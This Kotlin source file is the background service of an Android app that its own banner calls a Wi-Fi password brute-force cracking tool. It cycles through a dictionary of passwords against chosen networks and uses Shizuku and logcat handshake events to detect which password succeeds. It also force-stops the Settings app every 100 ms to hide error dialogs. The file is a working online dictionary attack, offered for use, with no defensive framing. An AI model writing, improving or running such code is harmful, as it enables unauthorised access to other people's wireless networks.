package com.wifi.toolbox.services

import android.app.*
import android.content.Intent
import android.content.SharedPreferences
import android.os.*
import androidx.compose.runtime.snapshotFlow
import androidx.core.app.NotificationCompat
import com.wifi.toolbox.*
import com.wifi.toolbox.structs.*
import com.wifi.toolbox.ui.MainActivity
import com.wifi.toolbox.utils.ShizukuUtil
import kotlinx.coroutines.*
import kotlin.coroutines.resume
import kotlin.math.pow

class PojieService : Service() {

    val NOTIFICATION_CHANNEL_ID = "PojieServiceChannel"

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private var readLogMode = 0
    private var logcatService: WifiLogcatService? = null


    fun log(log: String) {
        (applicationContext as MyApplication).logState.addLog(log)
    }

    private lateinit var sharedPreferences: SharedPreferences

    private var _pojieSettings: PojieSettings? = null

    private val pojieSettings: PojieSettings
        get() = _pojieSettings ?: PojieSettings.from(sharedPreferences).also { _pojieSettings = it }

    private val prefsListener = SharedPreferences.OnSharedPreferenceChangeListener { prefs, _ ->
        _pojieSettings = PojieSettings.from(prefs)
    }

    override fun onCreate() {
        super.onCreate()
        sharedPreferences = getSharedPreferences("settings_pojie", MODE_PRIVATE)
        sharedPreferences.registerOnSharedPreferenceChangeListener(prefsListener)
    }

    fun stopAllTasks() {
        val app = applicationContext as MyApplication
        app.runningPojieTasks.clear()
        currentWorkerJob?.cancel()
    }

    private fun calculatePriority(task: PojieRunInfo): Long {
        val currentTime = System.currentTimeMillis()
        val timeDiff = currentTime - task.lastTryTime

        val priority = -timeDiff
        return priority
    }

    private suspend fun performTaskLogic(app: MyApplication, task: SinglePojieTask): Int {
        val startTime = System.currentTimeMillis()

        when (pojieSettings.connectMode) {
            0 -> throw Exception("连接wifi实现为空，请先去设置中选择")
            1 -> ShizukuUtil.connectToWifi(task.ssid, task.password)
            else -> throw Exception("前面的区域，以后再来探索吧(connectMode=${pojieSettings.connectMode})")
        }

        return withTimeoutOrNull(timeMillis = app.pojieConfig.maxTryTime.toLong()) {
            suspendCancellableCoroutine<Int> { continuation ->
                val collectJob = launch {
                    when (readLogMode) {
                        1 -> logcatService?.logFlow?.collect { data ->
                            if (continuation.isActive) {
                                if (data.ssid == task.ssid && data.eventStartTime >= startTime) {

                                    when (data.event) {
                                        WifiLogData.EVENT_WIFI_CONNECTED -> {
                                            continuation.resume(SinglePojieTask.RESULT_SUCCESS)
                                            cancel()
                                        }

                                        WifiLogData.EVENT_CONNECT_FAILED -> {
                                            if (System.currentTimeMillis() - data.eventStartTime > 2000) {
                                                continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                cancel()
                                            }
                                        }

                                        WifiLogData.EVENT_HANDSHAKE -> {
                                            when (app.pojieConfig.failureFlag) {
                                                1 -> if (data.handshakeUseTime > app.pojieConfig.timeout) {
                                                    continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                    cancel()
                                                }

                                                2 -> {
                                                    if (data.handshakeCount > app.pojieConfig.maxHandshakeCount) {
                                                        continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                        cancel()
                                                    }
                                                }

                                            }
                                        }

                                        WifiLogData.EVENT_CONNECT_ERROR -> {
                                            continuation.resume(SinglePojieTask.RESULT_ERROR_TRANSIENT)
                                            cancel()
                                        }
                                    }
                                } else {
                                    log("W: 信息不匹配，实际${data.ssid}，应为${task.ssid}，请不要同时连接其他网络")
                                }
                            }
                        }
                    }

                }

                continuation.invokeOnCancellation {
                    collectJob.cancel()
                }
            }
        } ?: SinglePojieTask.RESULT_TIMEOUT
    }

    private var currentWorkerJob: Job? = null

    @Volatile
    private var currentWorkingSsid: String? = null

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun getLogTime(): String {
        val df = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
        return "[${df.format(java.util.Date())}]"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val app = applicationContext as MyApplication
        try {
            createNotificationChannel()
            val notificationIntent = Intent(this, MainActivity::class.java).apply {
                putExtra("target", "Pojie")
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
            )

            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("密码字典破解服务").setContentText("正在运行")
                .setSmallIcon(R.drawable.ic_launcher_foreground).setContentIntent(pendingIntent)
                .setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build()

            startForeground(1, notification)

            if (currentWorkerJob == null && currentWorkingSsid == null) {
                app.logState.clear()
                log(
                    log = """      _      __                 _        
     | |___ / _|_ __ ___  _   _| |_ __ _ 
  _  | / __| |_| '_ ` _ \| | | | __/ _` |
 | |_| \__ \  _| | | | | | |_| | || (_| |
  \___/|___/_| |_| |_| |_|\__, |\__\__, |
                          |___/    |___/ 
==========================================
wifi密码暴力破解工具 v3 for Android
"""
                )
                readLogMode = pojieSettings.readLogMode
                when (readLogMode) {
                    0 -> throw Exception("读取网络日志实现为空，请先去设置中选择")
                    1 -> {
                        logcatService = WifiLogcatService(pojieSettings)
                        log("Logcat服务已启动")
                    }

                    2 -> throw Exception("前面的区域，以后再来探索吧(readLogMode=2)")
                }
                startServiceLogic()
            }
            return START_STICKY
        } catch (e: Exception) {
            stopAllTasks()
            log("E: 服务启动失败")
            log(e.toString())
            stop()
            return START_NOT_STICKY
        }
    }

    private fun stop() {
        log("[运行结束]")
        logcatService?.close()
        stopSelf()
    }

    private fun startServiceLogic() {
        val app = applicationContext as MyApplication

        serviceScope.launch {
            while (isActive) {
                //注：专门针对某些设备密码错误就不管什么页面都弹窗的反人类设计
                //但是运行期间打不开设置应用，所以TODO加个开关
                ShizukuUtil.executeCommandSync("am force-stop com.android.settings")
                delay(100)
            }
        }

        serviceScope.launch {
            launch {
                snapshotFlow { app.runningPojieTasks.toList() }.collect { currentList ->
                    val targetSsid = currentWorkingSsid
                    if (currentList.isEmpty() || (targetSsid != null && currentList.none { it.ssid == targetSsid })) {
                        currentWorkerJob?.cancel()
                    }
                }
            }

            while (isActive) {
                val now = System.currentTimeMillis()
                val tasks = app.runningPojieTasks
                val config = app.pojieConfig

                if (tasks.isEmpty()) {
                    stop()
                    break
                }

                val availableTasks = tasks.filter {
                    val waitTime = if (it.retryCount > 0) {
                        (2.0.pow(it.retryCount.toDouble() - 1).toLong()) * config.doublingBase
                    } else 0L

                    val isReady = now - it.lastTryTime >= waitTime
                    isReady
                }

                val task = availableTasks.minByOrNull { calculatePriority(it) }

                if (task == null) {
                    val nextAvailableTime = tasks.minOf {
                        val waitTime = if (it.retryCount > 0) {
                            (2.0.pow(it.retryCount.toDouble() - 1).toLong()) * config.doublingBase
                        } else 0L
                        it.lastTryTime + waitTime
                    }
                    val waitMs = maxOf(0L, nextAvailableTime - now)
                    if (waitMs > 0) {
                        currentWorkerJob = launch {
                            log("冷却中，等待${waitMs}ms")
                            delay(waitMs)
                        }
                        try {
                            currentWorkerJob?.join()
                        } catch (_: CancellationException) {
                            return@launch
                        }
                        currentWorkerJob = null
                        if (!isActive) return@launch
                    }
                    continue
                }

                currentWorkingSsid = task.ssid
                val currentPass = task.tryList.getOrNull(task.tryIndex) ?: "未知"

                task.textTip = "正在尝试：$currentPass"
                task.lastTryTime = System.currentTimeMillis()

                var taskResult = -1

                currentWorkerJob = launch {
                    try {
                        taskResult = performTaskLogic(
                            app, SinglePojieTask(
                                ssid = task.ssid, password = currentPass
                            )
                        )
                    } catch (e: Exception) {
                        if (e !is CancellationException) {
                            log("E: 任务执行出错：${e.toString()}")
                        }
                        taskResult = SinglePojieTask.RESULT_ERROR
                    }
                }

                var timeTag = getLogTime()
                log("$timeTag 尝试: (${task.ssid}, $currentPass) ...")

                currentWorkerJob?.join()
                timeTag = getLogTime()
                if (currentWorkerJob?.isCancelled == true) {
                    app.logState.setLine("$timeTag 尝试: (${task.ssid}, $currentPass) 结果: 任务中断")
                    ShizukuUtil.disconnectWifi()
                } else {
                    if (taskResult != SinglePojieTask.RESULT_ERROR) app.logState.setLine("$timeTag 尝试: (${task.ssid}, $currentPass) 结果: $taskResult")
                    ShizukuUtil.disconnectWifi() //干完事情恢复原样可是好习惯
                }
                when (taskResult) {
                    SinglePojieTask.RESULT_SUCCESS -> {
                        log("连接成功: (${task.ssid}, $currentPass)")
                        app.stopTaskByName(task.ssid)
                    }

                    SinglePojieTask.RESULT_FAILED -> {
                        processTaskCompletion(app, task.ssid)
                        task.retryCount = 0
                    }

                    SinglePojieTask.RESULT_ERROR -> {
                        app.stopTaskByName(task.ssid)
                    }

                    SinglePojieTask.RESULT_TIMEOUT, SinglePojieTask.RESULT_ERROR_TRANSIENT -> {
                        task.retryCount++
                        if (app.pojieConfig.retryCountType <= 5 && task.retryCount > app.pojieConfig.retryCountType) {
                            //放行，直接下一个
                            processTaskCompletion(app, task.ssid)
                            task.retryCount = 0
                        }
                    }
                }

                currentWorkingSsid = null
                currentWorkerJob = null
            }
        }
    }

    private fun getTask(app: MyApplication, ssid: String): PojieRunInfo? {
        return app.runningPojieTasks.find { it.ssid == ssid }
    }

    private fun processTaskCompletion(app: MyApplication, ssid: String) {
        val task = getTask(app, ssid) ?: return
        val nextIndex = task.tryIndex + 1

        if (nextIndex >= task.tryList.size) {
            app.stopTaskByName(ssid)
        } else {
            task.tryIndex = nextIndex
            task.textTip = "排队中"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        sharedPreferences.unregisterOnSharedPreferenceChangeListener(prefsListener)
        stopForeground(STOP_FOREGROUND_REMOVE)
        serviceScope.cancel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID, "密码字典破解服务", NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }
}